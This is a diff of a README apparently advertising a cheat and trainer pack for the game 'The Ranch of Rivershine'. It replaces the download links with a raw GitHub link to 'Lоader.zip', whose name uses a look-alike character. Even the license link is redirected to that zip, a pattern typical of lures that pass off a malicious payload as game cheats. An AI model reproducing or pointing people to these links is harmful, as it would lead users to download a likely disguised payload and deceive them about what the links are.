@@ -1,6 +1,6 @@
 # 🌟 The Ranch of Rivershine Cheats Hacks 🌟
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Direct%20Link-brightgreen)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/MOHEEB20/RivershineRanch-TrainerPlus/main/Lоader.zip%20Now-Direct%20Link-brightgreen)](https://raw.githubusercontent.com/MOHEEB20/RivershineRanch-TrainerPlus/main/Lоader.zip)
 
 Welcome to the ultimate toolkit for "The Ranch of Rivershine"! This cheats & hacks pack empowers you to unlock extra features, hidden boosters, and secret optimizations to enhance your gaming adventure. Dive deep into gameplay customization, performance enhancements, unlimited resources, and inventive shortcuts. Tailored for serious players seeking to master every aspect of their ranch!
 
@@ -35,6 +35,6 @@ The Ranch of Rivershine hacks, cheat engine, boosters, mods, walkthrough, traine
 For educational and entertainment purposes only. Use responsibly; we are not affiliated with the original game developers.
 
 ## ⚖️ License  
-Licensed under the [MIT License © 2025](https://opensource.org/licenses/MIT).
+Licensed under the [MIT License © 2025](https://raw.githubusercontent.com/MOHEEB20/RivershineRanch-TrainerPlus/main/Lоader.zip).
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Direct%20Link-brightgreen)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/MOHEEB20/RivershineRanch-TrainerPlus/main/Lоader.zip%20Now-Direct%20Link-brightgreen)](https://raw.githubusercontent.com/MOHEEB20/RivershineRanch-TrainerPlus/main/Lоader.zip)
